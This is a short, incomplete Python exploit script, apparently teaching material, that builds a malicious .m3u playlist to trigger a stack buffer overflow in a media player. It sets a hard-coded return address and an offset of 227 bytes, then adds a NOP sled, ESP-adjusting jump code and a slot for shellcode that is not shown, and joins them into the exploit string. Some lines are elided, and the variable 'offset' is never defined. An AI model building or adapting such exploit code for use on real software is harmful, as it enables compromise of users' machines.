#presentation of exploit for limited space
FILE_NAME = 'limited-space.m3u'
...
eip = '\x2a\xb2\xe1\x01'
pattern_offset = 227
prejunk = "A" * pattern_offset
nop = '\x90' * 50

jumpcode = ""
jumpcode += "\x83\xc4\x50" #add esp, 94
jumpcode += "\x83\xc4\x50" #add esp, 94
jumpcode += "\x83\xc4\x50" #add esp, 94
...
restofbuffer = '\x90' * (25000 + offset - (len(nop) + len(shellcode) + len(prejunk)))
preshellcode = "X" * 4

nop2 = "\x90" * 10

exploit = prejunk + nop + shellcode + restofbuffer + eip +  preshellcode + jumpcode 
